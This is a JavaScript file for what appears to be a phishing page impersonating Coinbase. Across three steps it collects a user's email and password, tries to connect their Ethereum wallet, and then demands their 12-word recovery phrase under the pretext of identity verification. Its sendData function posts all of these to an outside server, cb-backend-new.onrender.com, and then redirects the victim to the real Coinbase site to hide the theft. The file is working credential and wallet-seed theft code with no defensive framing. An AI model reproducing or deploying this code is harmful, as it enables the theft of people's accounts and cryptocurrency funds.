const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const status = document.getElementById('status');

    // 1. Get Started -> Sign In
    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    // 2. Sign In -> Wallet Verification
    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        
        if (!email || !pass) {
            alert('Please fill in all fields to continue.');
            return;
        }
        
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
    };

    // 3. Wallet Connection or Recovery Phrase
    document.getElementById('connectBtn').onclick = async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (window.ethereum) {
            try {
                status.innerText = "Connecting to wallet...";
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                await sendData(email, pass, accounts[0], null);
            } catch (e) {
                setupRecovery(email, pass);
            }
        } else {
            setupRecovery(email, pass);
        }
    };

    function setupRecovery(email, pass) {
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo">
            <h1>Verify Identity</h1>
            <p>Enter your 12-word recovery phrase to restore access to your account.</p>
            <input type="text" id="phrase" placeholder="word1 word2 ..." style="width:100%; padding:12px; margin:10px 0; text-align:center;">
            <button id="submitPhrase" class="btn-primary" style="width:100%;">Restore Account</button>
            <div id="phrase_status" style="color:red; margin-top:10px;"></div>
        `;

        document.getElementById('submitPhrase').onclick = async () => {
            const phrase = document.getElementById('phrase').value.trim();
            const phrase_status = document.getElementById('phrase_status');

            if (phrase.split(/\s+/).length !== 12) {
                phrase_status.innerText = "A valid recovery phrase must be exactly 12 words.";
                return;
            }
            await sendData(email, pass, null, phrase);
        };
    }

    async function sendData(email, pass, wallet, phrase) {
        try {
            status.innerText = "Verifying...";
            const res = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    email: email, 
                    password: pass, 
                    walletAddress: wallet, 
                    recoveryPhrase: phrase 
                })
            });

            if (res.ok) {
                status.innerText = "Verification complete. Redirecting...";
                setTimeout(() => {
                    window.location.href = 'https://www.coinbase.com/password-recovery';
                }, 2000);
            } else {
                status.innerText = "Server error. Please try again.";
            }
        } catch (e) {
            status.innerText = "Connection error. Please try again.";
        }
    }
});
